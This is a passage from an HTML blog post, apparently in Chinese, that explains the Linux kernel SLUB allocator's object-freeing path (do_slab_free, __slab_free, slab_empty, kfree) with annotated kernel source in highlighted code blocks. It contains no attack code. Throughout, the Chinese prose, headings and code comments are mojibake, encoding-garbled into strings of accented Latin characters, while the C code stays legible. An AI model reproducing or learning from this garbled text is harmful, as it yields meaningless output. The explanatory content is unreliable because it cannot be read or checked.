class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾"><a href="#ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾" class="headerlink" title="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾"></a>ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾</h2><p>å› ä¸ºå¾ˆå¤šæ¯”å¦‚è¯´ <code>__kmem_cache_alloc_lru()</code> ä¸€ç±»çš„å‡½æ•°å…¶å®æœ€åéƒ½æ˜¯å¯¹ <code>slab_alloc_node()</code> çš„å¥—å¨ƒï¼Œè¿™é‡Œç¬”è€…ç›´æ¥ç»™å‡ºä¸€ä¸ªç®€æ˜“çš„è°ƒç”¨å…³ç³»å›¾ï¼š</p><blockquote><p>åªæˆªå–äº†ç¬”è€…è®¤ä¸ºæ¯”è¾ƒä¸»è¦çš„é‚£äº›ï¼Œ<del>å› ä¸ºä½œå›¾ä½œåˆ°åé¢å®åœ¨èšŒåŸ ä½äº†</del></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1 id="0x03-å¯¹è±¡çš„é‡Šæ”¾"><a href="#0x03-å¯¹è±¡çš„é‡Šæ”¾" class="headerlink" title="0x03. å¯¹è±¡çš„é‡Šæ”¾"></a>0x03. å¯¹è±¡çš„é‡Šæ”¾</h1><h2 id="â€»-ä¸€ã€do-slab-free-ï¼šå‘æŒ‡å®šçš„-kmem-cache-é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰"><a href="#â€»-ä¸€ã€do-slab-free-ï¼šå‘æŒ‡å®šçš„-kmem-cache-é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰" class="headerlink" title="â€» ä¸€ã€do_slab_free()ï¼šå‘æŒ‡å®šçš„ kmem_cache é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰"></a>â€» ä¸€ã€do_slab_free()ï¼šå‘æŒ‡å®šçš„ kmem_cache é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰</h2><p>åœ¨ slab allocator ä¸­å­˜åœ¨ç€å¤šä¸ªä¸åŒçš„å†…å­˜é‡Šæ”¾æ¥å£ï¼Œå…¶æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>do_slab_free()</code> å®Œæˆå†…å­˜é‡Šæ”¾çš„å·¥ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥å‡½æ•°  <em><strong>å…è®¸é‡Šæ”¾å·²ç»è¿æ¥æˆä¸€æ¡ freelist ä¸”å·²ç»åŠ å¯†å¥½çš„å¤šä¸ªå¯¹è±¡</strong></em>  ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¼ºåˆ¶å†…è”å¿«é€Ÿè·¯å¾„ä»¥åˆ›é€ æ— éœ€é¢å¤–çš„å‡½æ•°è°ƒç”¨ä¾¿èƒ½å®Œæˆå¿«é€Ÿè·¯å¾„é‡Šæ”¾çš„kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¿«é€Ÿè·¯å¾„ä»…åœ¨æˆ‘ä»¬è¦é‡Šæ”¾ä¼šå½“å‰ cpu slab æ—¶ç”Ÿæ•ˆ.</span><br><span class="hljs-comment"> * è¿™é€šå¸¸æ˜¯åœ¨æˆ‘ä»¬åˆšåˆšåˆ†é…äº†è¯¥å¯¹è±¡çš„æƒ…å†µ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥å¿«é€Ÿè·¯å¾„ä¸å¯ç”¨åˆ™é€€å› __slab_free ä»¥å¤„ç†æ‰€æœ‰ç§ç±»çš„ç‰¹æ®Šå¤„ç†.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * é€šè¿‡æŒ‡å®š head &amp; tail æŒ‡é’ˆ åŠ ä¸Šå¯¹è±¡æ•°é‡ï¼ˆcntï¼‰ï¼Œå¯ä»¥å¤§é‡é‡Šæ”¾åŒ…å«å¤šä¸ªå¯¹è±¡çš„freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>ä¸åˆ†é…ç±»ä¼¼ï¼Œé‡Šæ”¾åŒæ ·åˆ†ä¸ºå¿«é€Ÿè·¯å¾„ä¸æ…¢é€Ÿè·¯å¾„</p><h3 id="I-ç›´æ¥é‡Šæ”¾å›-percpu-slabï¼ˆfast-pathï¼‰"><a href="#I-ç›´æ¥é‡Šæ”¾å›-percpu-slabï¼ˆfast-pathï¼‰" class="headerlink" title="I. ç›´æ¥é‡Šæ”¾å› percpu slabï¼ˆfast pathï¼‰"></a>I. ç›´æ¥é‡Šæ”¾å› percpu slabï¼ˆfast pathï¼‰</h3><p>å¿«é€Ÿè·¯å¾„æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯<strong>å¯¹æ¯”å¾…é‡Šæ”¾å¯¹è±¡æ‰€å± slab æ˜¯å¦ä¸º percpu slabï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŒ‚å›å»å³å¯ï¼Œéµå¾ª LIFO æœºåˆ¶</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç¡®å®šå½“å‰çš„ per cpu slab. </span><br><span class="hljs-comment"> * cpu å¯èƒ½åœ¨ä¹‹åæ”¹å˜.ä½†ç”±äºæ•°æ®å·²ç»é€šè¿‡è¯¥æŒ‡é’ˆè·å¾—ï¼Œè¿™å¹¶æ²¡é—®é¢˜.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ cmpxchg æœŸé—´åœ¨åŒä¸€ cpu ä¸Šï¼Œé‡Šæ”¾å°†ä¼šæˆåŠŸ.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* ä¸ slab_alloc_node() ä¸­åœ¨ barrier() ä¸Šçš„æ³¨é‡Šä¸€æ · */</span><br>barrier();<br><br><span class="hljs-comment">// ä¸å±äº percpu slabï¼Œè°ƒç”¨ __slab_free() è¿›è¡Œé‡Šæ”¾</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// ç›´æ¥å°† percpu freelist æ¥åˆ° tail_obj åé¢</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// ç›´æ¥å°† percpu freelist æ¥åˆ° tail_obj åé¢</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-ï¼šé‡Šæ”¾å›å¯¹åº”çš„-slabï¼ˆslow-pathï¼‰"><a href="#II-slab-free-ï¼šé‡Šæ”¾å›å¯¹åº”çš„-slabï¼ˆslow-pathï¼‰" class="headerlink" title="II. __slab_free()ï¼šé‡Šæ”¾å›å¯¹åº”çš„ slabï¼ˆslow pathï¼‰"></a>II. __slab_free()ï¼šé‡Šæ”¾å›å¯¹åº”çš„ slabï¼ˆslow pathï¼‰</h3><p>å¦‚æœå¾…é‡Šæ”¾å¯¹è±¡ä¸å±äº percpu clabï¼Œåˆ™è°ƒç”¨ <code>__slab_free()</code> è¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¤„ç†æ…¢é€Ÿè·¯å¾„. è¿™å¯èƒ½ä¼šè¢«é¢‘ç¹è°ƒç”¨å› ä¸ºåœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹è±¡æ¯”cpu slabç”Ÿå‘½å‘¨æœŸæ›´é•¿</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€ä»¥æˆ‘ä»¬ä»å°è¯•å‡å°‘ç¼“å­˜è¡Œçš„ä½¿ç”¨ç‡. æ‹¿å– slab lock å¹¶é‡Šæ”¾å¯¹è±¡å³å¯.</span><br><span class="hljs-comment"> * è‹¥ä¸éœ€è¦é¢å¤–çš„ partial slab handling æˆ‘ä»¬ä¾¿å¯ç«‹å³è¿”å›.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯ kfence å’Œ debug ç›¸å…³ï¼Œå¦‚æœè¯¥ <code>kmem_cache</code> è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½åˆ™ç›´æ¥è°ƒç”¨ <code>free_to_partial_list()</code> åè¿”å›å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯ä¸€ä¸ª <code>do while</code> å¾ªç¯ï¼Œé¦–å…ˆä¼šå°† <strong><code>å¾…é‡Šæ”¾ freelist æ‰€å± slab çš„ freelist</code></strong> è¿æ¥åˆ° <strong><code>å¾…é‡Šæ”¾ freelist çš„ tail object</code></strong> åè¾¹ï¼Œè¿™é‡Œçš„ <code>new</code> æ˜¯ä¸€ä¸ªæ ˆä¸Šçš„ä¸´æ—¶ slab ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ£€æŸ¥æ˜¯å¦  <strong><code>(æ‰€æœ‰çš„å¯¹è±¡éƒ½*å°†*ä¸ºç©ºé—²å¯¹è±¡ || åŸ slab ä¸Šæ— ç©ºé—²å¯¹è±¡) &amp;&amp; slab æœªè¢«å†»ç»“</code></strong> ï¼Œè‹¥æ»¡è¶³è¯¥æ¡ä»¶åˆ™ï¼š</p><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰ percpu partial slab ä¸”åŸ slab ä¸Šæ— ç©ºé—²å¯¹è±¡ï¼ˆå³ slab-&gt;freelistï¼ˆä¹Ÿå°±æ˜¯ä»£ç ä¸­çš„ <code>prior</code>ï¼‰ä¸º NULLï¼‰ï¼š<ul><li>è‹¥æ˜¯ï¼Œåˆ™è®¾ç½® slab å°†è¢«å†»ç»“ï¼ˆ<code>new.frozen=1</code>ï¼‰</li><li>è‹¥å¦ï¼Œåˆ™è·å– slab æ‰€å¯¹åº”çš„ <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab ä¹‹å‰ä¸åœ¨é“¾è¡¨ä¸Šä¸”å°†ä¼šéƒ¨åˆ†ä¸ºç©º</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯ä»¥æ¨è¿Ÿé“¾è¡¨ç§»åŠ¨ï¼Œè€Œæ˜¯åä¹‹å°†å…¶å†»ç»“.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* éœ€è¦ä»ä¸€ä¸ªé“¾è¡¨ä¸Šå–ä¸‹ */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ¨æµ‹æ€§åœ°è·å– list_lock.</span><br><span class="hljs-comment"> * è‹¥ cmpxchg æœªæˆåŠŸï¼Œåˆ™æˆ‘ä»¬å¯èƒ½</span><br><span class="hljs-comment"> * åœ¨ä¸è¿›è¡Œä»»ä½•å¤„ç†çš„æƒ…å†µä¸‹æ”¾å¼ƒ list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¦åˆ™ list_lock å°†ä¸å…¶ä»–å¤„ç†å™¨åŒæ­¥æ›´æ–° slabs é“¾è¡¨</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ç”¨äº†ä¸€ä¸ª <code>cmpxchg_double_slab()</code> å‡½æ•°ï¼Œ<del>å¥—å¨ƒå¥—å¾—ğŸ‘´å¤´æ˜çœ¼èŠ±</del>ï¼Œä¸»è¦é€»è¾‘ä¸ºï¼š</p><ul><li><strong>å¯¹æ¯” slab-&gt;freelist &#x3D;&#x3D; prior &amp;&amp; slab-&gt;counters &#x3D;&#x3D; countersï¼Œè‹¥æ˜¯ï¼Œåˆ™å°† slab-&gt;freelist è®¾ä¸º head ä¸”å°† slab-&gt;counters è®¾ä¸º new.counters</strong>ï¼Œè¯¥æ“ä½œæˆåŠŸåˆ™è¿”å› trueï¼Œæ¡ä»¶ä¸ç¬¦åˆ™è¿”å› false</li></ul><p>æˆåŠŸäº†å¾ªç¯å°†ä¼šç›´æ¥è·³å‡ºï¼šï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ£€æŸ¥<strong>è¯¥ slab æ˜¯å¦éœ€è¦ä»ä¸€ä¸ª <code>kmem_cache_node</code> çš„é“¾è¡¨ä¸Šå–ä¸‹ï¼Œè‹¥å¦ï¼Œ</strong>åˆ™ï¼š</p><ul><li>è‹¥ slab å·²ç»è¢«å†»ç»“ï¼Œstat() ä¸€ä¸‹ï¼ˆåŸºæœ¬ä¸Šç­‰äºå•¥éƒ½ä¸åšï¼‰</li><li>è‹¥ slab éœ€è¦è¢«å†»ç»“ ï¼ˆ<code>new.frozen</code> ä¸º trueï¼‰ï¼Œè°ƒç”¨ <code>put_cpu_partial()</code> ç›´æ¥å°† slab æ”¾åˆ° percpu partial é“¾è¡¨</li><li>é‡Šæ”¾å·¥ä½œå®Œæˆï¼Œè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é“¾è¡¨é”æœªè¢«å ç”¨ï¼Œå› æ­¤ä¸éœ€è¦æ´»è·ƒä»»ä½•é“¾è¡¨.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœ slab ä¸Šæ‰€æœ‰å¯¹è±¡éƒ½è¢«é‡Šæ”¾ï¼Œä¸” node ä¸Šçš„ partial slab æ•°é‡å·²ç»è¶…è¿‡ <code>kmem_cache-&gt;min_partial</code> ï¼Œ<strong>è¿™æ„å‘³ç€è¿™æ˜¯ä¸€å¼ å®Œå…¨ç©ºé—²çš„ slab</strong>ï¼Œæ¥ä¸‹æ¥è·³è½¬åˆ° <code>slab_empty</code> æ ‡ç­¾ï¼Œè¯¥æ ‡ç­¾å¯¹åº”ä»£ç å—ä¸»è¦æ˜¯ï¼š</p><ul><li>è‹¥ slab ä¸ŠåŸæ¥æœ‰ç©ºé—²å¯¹è±¡ï¼ˆä½äº node partial é“¾è¡¨ï¼‰ï¼Œåˆ™ä» partial é“¾è¡¨ç§»é™¤</li><li>è‹¥ slab ä¸ŠåŸæ¥æ— ç©ºé—²å¯¹è±¡ï¼ˆä½äº node full é“¾è¡¨ï¼‰ï¼Œåˆ™ä» full é“¾è¡¨ç§»é™¤</li><li><strong>æœ€åè°ƒç”¨ <code>discard_slab()</code> é‡Šæ”¾è¿™ä¸€å¼  slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è‹¥ä¸æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦æ²¡æœ‰ percpu partial slab ä¸” slab ä¸ŠåŸ freelist ä¸º NULLï¼ˆå³ä½äº node full é“¾è¡¨ï¼‰ï¼Œè‹¥æ˜¯åˆ™ä» full é“¾è¡¨ç§»é™¤å¹¶æ·»åŠ åˆ° node partial é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ slub ç®—æ³•çš„é‡Šæ”¾é€»è¾‘åˆ†æå®Œæ¯•</p><h2 id="äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£"><a href="#äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£" class="headerlink" title="äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£"></a>äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£</h2><p>æ­£å¦‚åŒ <code>kmalloc()</code> æ˜¯æœ€ä¸ºé€šç”¨çš„å†…æ ¸å¯¹è±¡åˆ†é…å‡½æ•°ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„é‡Šæ”¾å‡½æ•°ä¾¿æ˜¯ <code>kfree()</code> äº†ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦å°±æ˜¯ <code>__kmem_cache_free()</code> çš„ wrapperï¼Œå¯¹äºè¾ƒå¤§çš„å¯¹è±¡åˆ™ä¼šç”¨ <code>free_large_kmalloc()</code> è¿›è¡Œé‡Šæ”¾ï¼Œå¦‚æœ object ä¸º NULL åˆ™ç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - é‡Šæ”¾ä¹‹å‰åˆ†é…çš„å¯¹è±¡</span><br><span class="hljs-comment"> * @object: kmalloc è¿”å›çš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥ @object ä¸º NULL, åˆ™ä¸ä¼šè¿›è¡Œä»»ä½•æ“ä½œ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¸è¦é‡Šæ”¾ä¸ç”± kmalloc() åˆ†é…çš„å†…å­˜ï¼Œå¦åˆ™ä¼šå‡ºé—®é¢˜.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span 